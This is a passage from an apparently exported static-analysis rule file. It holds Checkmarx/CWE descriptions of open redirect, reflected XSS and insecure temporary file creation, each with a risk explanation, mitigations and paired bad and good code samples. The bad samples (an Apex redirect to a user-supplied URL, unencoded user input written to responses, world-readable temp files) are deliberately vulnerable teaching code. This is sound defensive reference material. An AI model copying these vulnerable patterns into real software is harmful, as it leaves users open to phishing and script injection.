class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;476&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=476" target="_blank"&gt;NULL Pointer Dereference&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;674&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=674" target="_blank"&gt;Uncontrolled Recursion&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;MemberOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;711&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=711" target="_blank"&gt;Weaknesses in OWASP Top Ten (2004)&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="References"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;References&lt;/div&gt;&lt;div name="oc_730_References" id="oc_730_References" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;OWASP. "A9 Denial of Service". 2007. &amp;lt;&lt;a href="http://sourceforge.net/project/showfiles.php?group_id=64424&amp;amp;package_id=70827" target="_blank"&gt;http://sourceforge.net/project/showfiles.php?group_id=64424&amp;amp;package_id=70827&lt;/a&gt;&amp;gt;.&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_730_Content History" id="oc_730_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-08-15&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Veracode&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External Submission&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;Suggested creation of view and provided
mappings&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_620</key><name>Open_Redirect</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could use social engineering to get a victim to click a link to the application, so that the user will be immediately redirected to another, arbitrary site. Users may think that they are still in the original application site. The second site may be offensive, contain malware, or, most commonly, be used for phishing.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application redirects the user&amp;#8217;s browser to a URL provided in a user request, without warning users that they are being redirected outside the site. An attacker could use social engineering to get a victim to click a link to the application with a parameter defining another site to which the application will redirect the user&amp;#8217;s browser, and the user may not be aware of the redirection.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Ideally, do not allow arbitrary URLs for redirection. Instead, create a server-side mapping from user-provided parameter values to legitimate URLs.&lt;/li&gt;
&lt;li&gt;If it is necessary to allow arbitrary URLs:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;For URLs inside the application site, first filter and encode the user-provided parameter, and then use it as a relative URL by prefixing it with the application site domain.&lt;/li&gt;
&lt;li&gt;For URLs outside the application (if necessary), use an intermediate disclaimer page to provide users with a clear warning that they are leaving your site.&lt;/li&gt;
&lt;/ul&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
Avoid redirecting to arbitrary URLs, instead map the parameter to a list of static URLs.

      &lt;/h4&gt;&lt;pre&gt;


Response.Redirect(getUrlById(targetUrlId));



      &lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;
Avoid redirecting to arbitrary URLs, instead map the parameter to a list of static URLs.

      &lt;/h4&gt;&lt;pre&gt;


Response.Redirect(getUrlById(targetUrlId));


      &lt;/pre&gt;&lt;h3&gt;Apex&lt;/h3&gt;&lt;h4&gt;&lt;/h4&gt;&lt;pre&gt;String redirsite = ApexPages.currentPage().getParameters().get('redirlocation');
PageReference pageRef;
if(redirsite != null)
{
    pageRef = new PageReference(redirsite);
    pageRef.setRedirect(true);
    return pageRef;
}
pageRef = ApexPages.currentPage();
return pageRef;&lt;/pre&gt;&lt;h4&gt;&lt;/h4&gt;&lt;pre&gt;String redirsite = ApexPages.currentPage().getParameters().get('redirlocation');
PageReference pageRef;
if(redirsite != null)
{
    pageRef = new PageReference('http://domain.com/page.jsp?' + redirsite);
    pageRef.setRedirect(true);
    return pageRef;
}
pageRef = ApexPages.currentPage();
return pageRef;&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1063</key><name>Potential_O_Reflected_XSS_All_Clients</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could use social engineering to cause a user to send the website engineered input, rewriting web pages and inserting malicious scripts. The attacker can then pretend to be the original website, which would enable the attacker to steal the user's password, request the user&amp;#8217;s credit card information, provide false information, or run malware. From the victim&amp;#8217;s point of view, this is the original website, and the victim would blame the site for incurred damage.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application creates web pages that include data from previous user input. The user input is embedded directly in the page's HTML, causing the browser to display it as part of the web page. If the input includes HTML fragments or JavaScript, these are displayed too, and the user cannot tell that this is not the intended page. The vulnerability is the result of embedding arbitrary user input without first encoding it in a format that would prevent the browser from treating it like HTML instead of plain text.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ol&gt;
&lt;li&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Fully encode all dynamic data before embedding it in output.&lt;/li&gt;
&lt;li&gt;Encoding should be context-sensitive. For example:&lt;/li&gt;
&lt;ul&gt;
&lt;li&gt;HTML encoding for HTML content&lt;/li&gt;
&lt;li&gt;HTML Attribute encoding for data output to attribute values&lt;/li&gt;
&lt;li&gt;JavaScript encoding for server-generated JavaScript.&lt;/li&gt;
&lt;/ul&gt;
&lt;li&gt;Consider using either the ESAPI encoding library, or the built-in platform functions. For earlier versions of ASP.NET, consider using the AntiXSS library.&lt;/li&gt;
&lt;li&gt;In the Content-Type HTTP response header, explicitly define character encoding (charset) for the entire page.&lt;/li&gt;
&lt;li&gt;Set the httpOnly flag on the session cookie, to prevent XSS exploits from stealing the cookie.&lt;/li&gt;
&lt;/ol&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Bad - The application uses the "Referer" field string to construct the HttpResponse&lt;/h4&gt;&lt;pre&gt;public class ReflectedXssAllClients
{
        public static void foo(HttpRequest Request, HttpResponse Response)
        {
                string Referer = Request.QueryString["Referer"];
                Response.BinaryWrite(Referer);
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The "Referer" field string is HTML encoded before use&lt;/h4&gt;&lt;pre&gt;public class ReflectedXssAllClientsFixed
{
        public static void foo(HttpRequest Request, HttpResponse Response, AntiXss.AntiXssEncoder encoder)
        {
                string Referer = Request.QueryString["Referer"];
                Response.BinaryWrite(encoder.HtmlEncode(Referer, true));
        }
}&lt;/pre&gt;&lt;h4&gt;Bad - User input is written to a TextBox displayed on the screen enabling a user to inject a script&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSSpecificClients
{
        public void foo(TextBox tb)
        {
                string input = Console.ReadLine();
                tb.Text = input;
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The user input is HTML encoded before being displayed on the screen&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSSpecificClientsFixed
{
        public void foo(TextBox tb, AntiXssEncoder encode)
        {
                string input = Console.ReadLine();
                tb.Text = encode.HtmlEncode(input);
        }
}&lt;/pre&gt;&lt;h4&gt;Bad - The application uses the "filename" field string from an HttpRequest construct an HttpResponse&lt;/h4&gt;&lt;pre&gt;public class UTF7XSS
{
        public void foo(HttpRequest Request, HttpResponse Response
        {
                Response.Charset("UTF-7");
                string filename = Request.QueryString["filename"];
                Response.BinaryWrite(AntiXss.HtmlEncode(filename));
        }
}&lt;/pre&gt;&lt;h4&gt;Good - The "filename" string is converted to an int and using a switch case the new "filename" string is constructed&lt;/h4&gt;&lt;pre&gt;public class UTF7XSSFixed
{
        public static void foo(HttpRequest Request, HttpResponse Response)
        {
                Response.Charset("UTF-7");
                string filename = Request.QueryString["fileNum"];
                int fileNum = Convert.ToInt32(filename);
                
                switch(fileNum)
                {
                        case 1:
                                filename = "File1.txt";
                                break;
                        default:
                                filename = "File2.txt";
                                break;
                }
                
                Response.BinaryWrite(AntiXss.HtmlEncode(filename));
        }
}&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;User input is written to a label displayed on the screen enabling a user to inject a script&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSAllClients {
	public static void XSSExample(TextArea name) {	
		Label label = new Label();		
		label.setText("Hello " + name.getText());	
	}
}&lt;/pre&gt;&lt;h4&gt;Switch case is used in order to assemble the label's text value and manage wrong user input&lt;/h4&gt;&lt;pre&gt;public class ReflectedXSSAllClientsFixed {
	public static void XSSExample(TextArea name) {
		Label label = new Label();		
		switch (name) {
		case "Joan":
			label.setText("Hello Joan");	
			break;
		case "Jim":
			label.setText("Hello Jim");	
			break;
		case "James":
			label.setText("Hello James");	
			break;
		default:
			System.out.println("Wrong Input");
		}
	}
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1662</key><name>Creation_of_Temp_File_With_Insecure_Permissions</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Creation of Temporary File With Insecure Permissions&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;378&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_378_Description" id="oc_378_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;Opening temporary files without appropriate measures or
controls can leave the file, its contents and any function that it impacts
vulnerable to attack.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_378_Time of Introduction" id="oc_378_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_378_Applicable Platforms" id="oc_378_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;All&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_378_Common Consequences" id="oc_378_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;If the temporary file can be read, by the attacker, sensitive
information may be in that file which could be revealed.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Authorization&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;If that file can be written to by the attacker, the file might be
moved into a place to which the attacker does not have access. This will
allow the attacker to gain selective resource access-control
privileges.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Integrity&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Depending on the data stored in the temporary file, there is the
potential for an attacker to gain an additional input vector which is
trusted as non-malicious. It may be possible to make arbitrary changes
to data structures, user information, or even process ownership.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Likelihood of Exploit"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Likelihood of Exploit&lt;/div&gt;&lt;div name="oc_378_Likelihood of Exploit" id="oc_378_Likelihood of Exploit" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;High&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_378_Demonstrative Examples" id="oc_378_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example Languages: &lt;/span&gt;C and C++&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;FILE *stream; char tempstring[] = "String to be written";&lt;/div&gt;&lt;div style="font-size:90%;"&gt;if( (stream = tmpfile()) == NULL ) {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;perror("Could not open new temporary file\n");&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;return (-1);&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;div style="font-size:90%;"&gt;/* write data to tmp file */&lt;/div&gt;&lt;div style="font-size:90%;"&gt;/* ... */&lt;/div&gt;&lt;div style="font-size:90%;"&gt;_rmtmp();&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;The temp file created in the above code is always readable and
writable by all users.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;try {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;File temp = File.createTempFile("pattern", ".suffix");&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;temp.deleteOnExit();&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;BufferedWriter out = new BufferedWriter(new
FileWriter(temp));&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;out.write("aString");&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;out.close();&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;div style="font-size:90%;"&gt;catch (IOException e) {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;This temp file is readable by all users.&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_378_Potential Mitigations" id="oc_378_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Tempfile creation should be done in a safe way. To be safe, the temp
file function should open up the temp file with appropriate access
control. The temp file function should also retain this quality, while
being resistant to race conditions.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Requirements specification: Many contemporary languages have functions
which properly handle this condition. Older C temp file functions are
especially susceptible.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;Ensure that you use proper file permissions. This can be achieved by
using a safe temp file function. Temporary files should be writable and
readable only by the process which own the file.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;Randomize temporary file names. This can also be achieved by using a
safe temp-file function. This will ensure that temporary files will not
be created in predictable places.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_378_Relationships" id="oc_378_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;376&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=376" target="_blank"&gt;Temporary File Issues&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;377&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=377" target="_blank"&gt;Insecure Temporary File&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_378_Taxonomy Mappings" id="oc_378_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;CLASP&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Improper temp file opening&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_378_Content History" id="oc_378_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CLASP&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" 